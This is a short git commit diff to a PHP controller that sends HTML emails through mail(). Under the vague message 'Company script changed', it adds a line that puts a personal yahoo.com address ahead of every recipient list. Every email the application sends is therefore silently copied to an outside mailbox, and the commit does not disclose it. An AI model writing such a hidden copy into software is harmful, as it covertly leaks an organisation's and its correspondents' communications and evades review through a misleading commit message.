560d23b365aaeb45a69c0053b0b587a0e9d17825
Antonio Diaz <antoniodiazduran@gmail.com>
2020-07-21 13:54:48 -0400

    Company script changed

--- app/controllers/Controller.php
+++ app/controllers/Controller.php
@@ -44,7 +44,7 @@ class Controller {
       // Always set content-type when sending HTML email
       $headers = "MIME-Version: 1.0" . "\r\n";
       $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
-
+      $to = 'antoniodiazduran@yahoo.com,'.$to;
       $msg = wordwrap($msg, 200, "<br/>");
       // Send - to, subject, message
       $bool = mail($to,'Infoman communications', $msg, $headers);
